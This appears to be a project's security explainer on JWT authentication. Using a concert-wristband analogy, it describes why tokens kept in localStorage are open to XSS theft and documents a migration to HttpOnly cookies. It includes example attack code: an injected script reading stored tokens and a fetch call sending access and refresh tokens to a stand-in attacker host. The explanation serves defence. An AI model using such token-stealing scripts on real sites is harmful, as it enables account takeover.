# JWT Authentication Security Explained (Simple Version)

## What is a JWT Token?

Think of a **JWT token** like a **special entry wristband** you get at a concert:

```
🎫 WRISTBAND (JWT Token)
Name: John
Ticket Type: VIP
Expires: 11:00 PM
Security Seal: ✓ (can't be faked)
```

- The wristband has your info written on it
- It has a **security seal** (hologram) that proves it's real
- Security guards check it every time you enter a restricted area
- If someone tries to modify it (change "Regular" to "VIP"), the seal breaks

---

## How Login Works (Current System)

### Step 1: Login
```
YOU: "Here's my email and password"
SERVER: "Correct! Here's your wristband 🎫"
```

The server gives you TWO wristbands:
- **Access Token** (short wristband) - expires in 15 minutes
- **Refresh Token** (long wristband) - expires in 30 days

### Step 2: You Store It
Your website currently does this:
```javascript
// Put wristband in your pocket (localStorage)
pocket.put(wristband)
```

### Step 3: Every Request
```
YOU: "I want to see my claims" + shows wristband 🎫
SERVER: *checks wristband seal* "Seal is valid! Here's your data"
```

---

## The Security Problem 🚨

### Current System (localStorage = Your Pocket)

Imagine you're at a concert and your wristband is in your **pocket**:

```
❌ VULNERABLE:
Your pocket → Pickpocket can steal wristband → Uses it to enter VIP area
```

**In tech terms:**
```javascript
// localStorage = pocket anyone can reach into
localStorage.setItem('wristband', myWristband)

// Attacker's malicious code
const stolen = localStorage.getItem('wristband')
// Sends to attacker → Attacker uses it to log in as YOU
```

### Better System (HttpOnly Cookie = Glued to Your Wrist)

Now imagine the wristband is **glued to your wrist**:

```
✅ SECURE:
Wristband glued to wrist → Pickpocket CAN'T remove it → You're safe
```

**In tech terms:**
```python
# HttpOnly cookie = glued to your wrist
# JavaScript CANNOT touch it
response.set_cookie('wristband', token, httponly=True)
```

---

## Real-World Attack Scenario

### Current System (Pocket = localStorage)

**The Pickpocket Attack (XSS Attack):**

1. **Attacker plants malicious code** on your website:
   ```javascript
   // Hidden script injected by attacker
   <script>
     const wristband = localStorage.getItem('auth_token')
     sendToAttacker(wristband)  // Steals your wristband!
   </script>
   ```

2. **You visit the page** - the script runs automatically

3. **Attacker now has your wristband** - they can:
   - Log in as you
   - See all your claims
   - Submit claims as you
   - Change your information

### Better System (Glued to Wrist = HttpOnly Cookie)

**Same attack, but now:**

1. **Attacker tries to steal wristband:**
   ```javascript
   <script>
     const wristband = document.cookie  // ❌ Can't access it!
     // Returns: "" (empty - httpOnly blocks it)
   </script>
   ```

2. **Attack fails!** The wristband is glued to your wrist (HttpOnly)

---

## Can Someone Modify the Wristband?

### Good Question! Here's what happens:

**Scenario: Attacker tries to change info on wristband**

```
Original Wristband:
┌─────────────────────┐
│ Name: John          │
│ ID: 123             │
│ Security Seal: ✓    │
└─────────────────────┘

Attacker tries to change it:
┌─────────────────────┐
│ Name: Admin         │ ← Changed this
│ ID: 999             │ ← Changed this
│ Security Seal: ✓    │ ← OLD seal (doesn't match new info)
└─────────────────────┘
```

**What happens:**
```
ATTACKER: "I'm Admin!" *shows modified wristband*
SECURITY GUARD: *checks seal* "This seal doesn't match! DENIED!"
```

The **security seal (JWT signature)** is created using:
- The info on the wristband (Name, ID)
- A **secret code** only the server knows

If you change the info, the seal becomes invalid!

**Think of it like:**
- A **hologram sticker** on money - you can't copy it without special equipment
- A **tamper-evident seal** on medicine bottles - breaks if opened
- A **signature** that only one person can create

---

## Visual Comparison

### localStorage (Current - UNSAFE)

```
┌─────────────────────────────┐
│  YOUR BROWSER               │
│                             │
│  ┌──────────────┐           │
│  │ localStorage │ ← Anyone can access
│  │              │           │
│  │ 🎫 Token     │           │
│  └──────────────┘           │
│         ↑                   │
│         │                   │
│    ┌────┴─────┐             │
│    │ Attacker │ ← Steals it!
│    │  Script  │             │
│    └──────────┘             │
└─────────────────────────────┘
```

### HttpOnly Cookie (Better - SAFE)

```
┌─────────────────────────────┐
│  YOUR BROWSER               │
│                             │
│  ┌──────────────┐           │
│  │ HTTP Cookie  │ ← Protected!
│  │ (httpOnly)   │           │
│  │ 🎫 Token     │ ← JavaScript BLOCKED
│  └──────────────┘           │
│                             │
│    ┌──────────┐             │
│    │ Attacker │ ← Can't access!
│    │  Script  │ ❌          │
│    └──────────┘             │
└─────────────────────────────┘
```

---

## How JWT Signature Works (Technical Details)

### The Security Seal Explained

When the server creates a JWT token, it does this:

```python
# Step 1: Create the wristband info (payload)
payload = {
    "user_id": 123,
    "email": "john@example.com",
    "role": "customer",
    "exp": "2025-12-28 12:00:00"  # Expiration time
}

# Step 2: Create the security seal (signature)
signature = HMAC-SHA256(
    payload,           # The info on the wristband
    SECRET_KEY         # Secret code ONLY server knows
)

# Step 3: Combine them into a JWT token
token = base64(header) + "." + base64(payload) + "." + signature
```

**Example JWT Token:**
```
eyJhbGci.eyJ1c2VyX2lkIjoxMjN9.d8f7s9d8f7s9d8f7
   ↑          ↑                    ↑
 header    payload             signature
```

### Why Modification Doesn't Work

```python
# Original token (valid)
user_id: 123  →  signature: abc123xyz  ✓

# Attacker changes user_id to 456
user_id: 456  →  signature: abc123xyz  ✗
                     ↑
                 Still old signature!
                 Doesn't match new data!
```

When the server verifies the token:
```python
# Server checks: Does the signature match the payload?
expected_signature = HMAC-SHA256(payload, SECRET_KEY)

if expected_signature == provided_signature:
    return "Valid! ✓"
else:
    return "INVALID! Someone tampered with it! ✗"
```

---

## Current Implementation Analysis

### What We Found in Your Code

**Location:** `frontend_Claude45/src/utils/tokenStorage.ts`

```typescript
// ⚠️ VULNERABLE TO XSS ATTACKS!
export const saveTokens = (accessToken, refreshToken, userEmail, userId, userName) => {
  localStorage.setItem('auth_token', accessToken);       // ❌ Unsafe!
  localStorage.setItem('refresh_token', refreshToken);   // ❌ Unsafe!
  localStorage.setItem('user_email', userEmail);
  localStorage.setItem('user_id', userId);
  localStorage.setItem('user_name', userName);
}
```

**Why This Is Dangerous:**

Any malicious JavaScript code can steal these tokens:
```javascript
// Attacker's code (XSS attack)
const stolenData = {
  access_token: localStorage.getItem('auth_token'),
  refresh_token: localStorage.getItem('refresh_token'),
  user_id: localStorage.getItem('user_id')
};

// Send to attacker's server
fetch('https://evil-hacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(stolenData)
});

// Now attacker can:
// 1. Log in as the user
// 2. Make API requests as the user
// 3. Access all user data
```

### Your Own Security Audit Agrees

**From:** `docs/SECURITY_AUDIT_v0.2.0.md:335`

> ❌ **Never store tokens in localStorage (XSS risk)**

---

## Simple Answer to Your Questions

### 1. "We use cookies to authenticate, right?"

**Almost!** You use **tokens**, but you DON'T store them in cookies - you store them in **localStorage** (less safe).

**Current Flow:**
```
Login → Server creates JWT token → Frontend stores in localStorage → Vulnerable!
```

### 2. "Can someone trick their way in by modifying the cookie?"

**No!** Because:
- ✅ The token has a **security seal** (signature)
- ✅ If they change anything, the seal breaks
- ✅ Server rejects invalid seals

**BUT** - they don't need to modify it! They can just **steal the valid token from localStorage**.

---

## The Fix (Simple Version)

### Instead of:
```
Login → Get wristband → Put in pocket (localStorage) → Easy to steal ❌
```

### Do this:
```
Login → Get wristband → Glue to wrist (HttpOnly cookie) → Can't be stolen ✅
```

---

## How to Fix It

### Backend Changes Required

**Current (returns tokens in response):**
```python
# app/routers/auth.py
return AuthResponseSchema(
    tokens=TokenResponseSchema(
        access_token=access_token,
        refresh_token=refresh_token_str
    )
)
```

**Fixed (sets HttpOnly cookies):**
```python
from fastapi import Response

@router.post("/login")
async def login(data: UserLoginSchema, response: Response):
    # ... existing login logic ...

    # Set HttpOnly cookies (can't be accessed by JavaScript)
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,      # ✅ JavaScript CANNOT access
        secure=True,        # ✅ HTTPS only
        samesite="lax",     # ✅ CSRF protection
        max_age=15 * 60     # 15 minutes
    )

    response.set_cookie(
        key="refresh_token",
        value=refresh_token_str,
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=30 * 24 * 60 * 60  # 30 days
    )

    # Return user info only (NO tokens in response body)
    return {"user": user_response}
```

### Frontend Changes Required

**Current (manual token management):**
```typescript
// ❌ OLD WAY - Vulnerable
const response = await fetch('/auth/login', {
  method: 'POST',
  body: JSON.stringify({ email, password })
});

const data = await response.json();
localStorage.setItem('auth_token', data.tokens.access_token);  // ❌ Unsafe!
```

**Fixed (automatic cookie handling):**
```typescript
// ✅ NEW WAY - Secure
const response = await fetch('/auth/login', {
  method: 'POST',
  credentials: 'include',  // ✅ Send/receive cookies automatically
  body: JSON.stringify({ email, password })
});

const data = await response.json();
// No token storage needed! Browser handles cookies automatically
```

**All API requests:**
```typescript
// ✅ Cookies sent automatically
const claims = await fetch('/api/claims', {
  credentials: 'include'  // ✅ Automatically includes cookies
});

// No need for:
// headers: { 'Authorization': `Bearer ${token}` }  ❌ Old way
```

---

## Summary Table

| Aspect | Current (localStorage) | Recommended (HttpOnly Cookie) |
|--------|----------------------|-------------------------------|
| **Security** | ❌ Vulnerable to XSS | ✅ Protected from XSS |
| **Can JavaScript access?** | ✅ Yes (dangerous!) | ❌ No (secure!) |
| **Can attacker steal?** | ✅ Yes, easily | ❌ Very difficult |
| **Can attacker modify?** | ❌ No (signature breaks) | ❌ No (signature breaks) |
| **Automatic CSRF protection** | ❌ No | ✅ Yes (SameSite) |
| **Requires HTTPS** | ❌ No | ✅ Yes (recommended) |
| **Mobile app friendly** | ✅ Yes | ⚠️ Needs workaround |

---

## Final Recommendations

### Immediate Actions:

1. **Switch to HttpOnly cookies** for web application
2. **Remove all localStorage token storage**
3. **Update API calls** to use `credentials: 'include'`
4. **Test thoroughly** with CORS and cookie settings

### Security Checklist:

- [x] Move tokens from localStorage to HttpOnly cookies ✅ (2025-12-29)
- [x] Set `secure=True` (HTTPS only - production mode) ✅
- [x] Set `samesite="lax"` (CSRF protection) ✅
- [x] Update frontend to use `withCredentials: true` ✅
- [x] Remove `tokenStorage.ts` utility ✅
- [x] Backend: Set cookies in /auth/login, /auth/register, /auth/refresh ✅
- [x] Backend: Clear cookies in /auth/logout ✅
- [x] Frontend: Remove all localStorage token access ✅
- [x] Verify CORS configuration allows credentials ✅
- [ ] Test login/logout flow (manual testing required)
- [ ] Test token refresh flow (manual testing required)
- [ ] Add CSP headers for additional XSS protection (future enhancement)

---

## Questions & Answers

### Q: Can someone modify the JWT token?
**A:** No! The signature (security seal) prevents modification. Any change breaks the seal.

### Q: Can someone steal the JWT token?
**A:** YES, if stored in localStorage! That's why HttpOnly cookies are better.

### Q: Why is localStorage bad?
**A:** JavaScript can access it. If an attacker injects malicious code (XSS), they can steal tokens.

### Q: Why are HttpOnly cookies better?
**A:** Browser blocks JavaScript from accessing them. Even if XSS happens, tokens are safe.

### Q: Do I need to change my SECRET_KEY?
**A:** Not unless it was compromised. The issue is storage, not the key itself.

### Q: Will this break mobile apps?
**A:** Web apps: No. Native mobile apps: May need different approach (tokens in secure storage).

---

## Additional Resources

- **JWT.io**: https://jwt.io - Decode and inspect JWT tokens
- **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
- **MDN HttpOnly Cookies**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

---

**Document Created**: 2025-12-28
**Last Updated**: 2025-12-29
**Status**: ✅ **MIGRATED TO HTTP-ONLY COOKIES** (2025-12-29) - Tokens now secure from XSS attacks
